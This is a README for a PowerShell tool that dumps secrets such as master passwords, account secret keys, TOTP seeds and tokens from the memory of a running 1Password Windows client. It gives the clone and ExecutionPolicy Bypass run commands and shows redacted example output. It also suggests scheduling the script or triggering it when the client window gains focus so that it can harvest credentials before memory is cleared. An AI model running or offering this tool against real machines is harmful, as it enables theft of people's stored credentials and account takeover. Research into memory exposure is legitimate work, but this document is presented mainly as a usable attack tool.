# 1Password Secrets Dump

The 1Password password manager client keeps a lot of sensitive information in memory, such as credentials or any other type of document saved within the database.

A local user with **administrative privileges** can exfiltrate many of the secrets kept by 1Password by performing a memory dump of the `1Password.exe` process.

## Table of Contents

- [1Password Secrets Dump](#1password-secrets-dump)
  - [Table of Contents](#table-of-contents)
  - [About the issue](#about-the-issue)
  - [Getting Started](#getting-started)
    - [Prerequisites](#prerequisites)
    - [Installation](#installation)
  - [Usage](#usage)
    - [Example](#example)
  - [Known issues](#known-issues)
  - [Contributing](#contributing)
  - [Authors](#authors)
  - [Disclaimer](#disclaimer)
  - [License](#license)

## About the issue

_When you view an item in 1Password, the information must be decrypted for you to see it. 1Password temporarily stores this information in your computer’s memory while 1Password is open._

_This means that while 1Password is open, it’s possible for someone who has access to your computer to read that information from your computer’s memory. Under normal circumstances, only you have access to that information. This is how all software works._
[https://support.1password.com/kb/201902a/#about-the-issue](https://support.1password.com/kb/201902a/#about-the-issue)

## Getting Started

Thanks to these instructions, you can get a copy of the project up and run on your local machine for development and testing purposes.

### Prerequisites

- PowerShell
- 1Password client for Windows

### Installation

```powershell
git clone https://github.com/MrTiz/1Password-Secrets-Dump.git
```

## Usage

```powershell
PowerShell.exe -ExecutionPolicy Bypass -File .\1PasswordSecretsDump.ps1
```

### Example

```powershell
PowerShell.exe -ExecutionPolicy Bypass -File .\1PasswordSecretsDump.ps1
```
```json
...

{"account_state":"[REDACTED]","account_template_version":"[REDACTED]","account_type":"[REDACTED]","account_version":11,"base_attachment_url":"https://f.1passwordusercontent.eu/","base_avatar_url":"https://a.1passwordusercontent.eu/","secret_key":"[REDACTED]","enc_srp_x":{"cty":"b5+jwk+json","kid":"srpxkey","enc":"A256GCM","iv":"[REDACTED]","data":"[REDACTED]"},"sign_in_url":"https://my.1password.eu/","team_avatar":"[REDACTED]","team_name":"[REDACTED]","updated_at":"[REDACTED]","user_avatar":"[REDACTED]","user_email":"[REDACTED]","user_name":"[REDACTED]","user_keyset_version":"[REDACTED]","user_uuid":"[REDACTED]","user_version":"[REDACTED]","acl":"[REDACTED]","device_uuid":"[REDACTED]","billing_status":"[REDACTED]","storage_capacity":"[REDACTED]","storage_used":"[REDACTED]","account_template_language":"en-US","enc_unlock_key":{"cty":"b5+jwk+json","kid":"system_lock_protector","enc":"A256GCM","iv":"[REDACTED]","data":"[REDACTED]"},"enc_local_validation_key":{"cty":"b5+jwk+json","kid":"core-setting-authkey-wrapper","enc":"A256GCM","iv":"[REDACTED]","data":"[REDACTED]"}}

{"sections":[{"name":"[REDACTED]","title":"Secret Key","fields":[{"t":"secret key","n":"account-key","k":"concealed","v":"[REDACTED]"},{"t":"one-time password","n":"TOTP_[REDACTED]","k":"concealed","v":"[REDACTED]"}]},{"name":"linked items","title":"Related Items"}],"fields":[{"name":"email","value":"[REDACTED]","type":"T","designation":"username","id":""},{"name":"master-password","value":"[REDACTED]","type":"P","designation":"password","id":""},{"name":"account-key","value":"[REDACTED]","type":"T","id":""}],"notesPlain":"You can use this login to sign in to your account on 1password.eu."}

{"fields":[{"value":"MrTiz","name":"username","type":"T","designation":"username","id":""},{"value":"[REDACTED]","name":"password","type":"P","designation":"password","id":""}],"htmlForm":{},"sections":[{"name":"Section_[REDACTED]","title":"","fields":[{"k":"concealed","n":"TOTP_[REDACTED]","t":"one-time password","v":"otpauth://totp/Github:[REDACTED]?secret=[REDACTED]&period=[REDACTED]&digits=[REDACTED]&issuer=[REDACTED]"},{"k":"email","n":"[REDACTED]","t":"email","v":"[REDACTED]"},{"k":"concealed","n":"[REDACTED]","t":"Token","v":"[REDACTED]"},{"k":"phone","n":"[REDACTED]","t":"phone","v":"[REDACTED]"}]},{"name":"linked items","title":"Related Items"}],"notesPlain":"[REDACTED]","passwordHistory":[{"value":"[REDACTED]","time":"[REDACTED]"}]}

...
```

**N.B.** <u>Keep in mind that since version 7.4.750 for Windows, process memory is cleared much faster than in previous versions</u>. This was the result of what has been a long-term and ongoing project to rewrite 1Password for Windows in Rust [[kb/201902a](https://support.1password.com/kb/201902a/#update-highlights)].
So the ability to properly exfiltrate credentials is also a matter of luck as it is important to be able to run the script before the secrets are deleted from the process memory. Otherwise, you can schedule the script to run automatically at regular intervals or to run based on the visibility or focus of the client window. 😉

## Known issues
- If any of the fields within the JSON objects to be exfiltrated contain non-ASCII characters (e.g., emoji) pattern matching will fail!

## Contributing

Contributions are what make the open source community such a good place to learn, inspire, and create. 
Any contributions you can provide are **greatly appreciated**.

1. Fork the Project
2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the Branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## Authors

- **[Tiziano Marra](https://github.com/MrTiz)**

## Disclaimer

This exploit was developed and published for educational and research purposes only. The author assumes no responsibility for any illegal use. Use it at your own risk and only against systems for which you are authorized to test it.

## License
[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)

This project is licensed under the GNU General Public License v3.0 - see the 
[LICENSE](https://github.com/MrTiz/1Password-Secrets-Dump/blob/main/LICENSE) file for details.
